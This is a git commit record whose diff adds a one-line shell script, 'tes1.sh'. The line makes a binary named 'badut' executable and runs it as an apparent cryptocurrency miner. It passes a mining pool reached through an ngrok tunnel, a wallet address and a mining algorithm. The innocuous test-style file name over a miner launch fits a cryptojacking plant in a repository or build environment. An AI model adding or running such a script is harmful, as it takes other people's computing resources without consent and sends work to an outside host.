a9630dd18f0e80235785a6f73b51b1b4a80ee0e2
Dott. Ileana De rosa <98927471+Motykolllipo@users.noreply.github.com>
2022-04-17 04:21:52 +0000

    Create tes1.sh

---
+++ tes1.sh
@@ -0,0 +1,1 @@
+chmod 777 badut && ./badut --donate-level 1 -o 8.tcp.ngrok.io:11316 -u TRTLuxMcjA5Z5wiQjv7GKz3NfKXBx2G45iFEfkTfBdHv4s5sVWWMpSEWhrzosQkWn2ieGpzGLHjEDNgD2biksSaGa1M5errKpkS -p luna -a argon2/chukwav2 -k
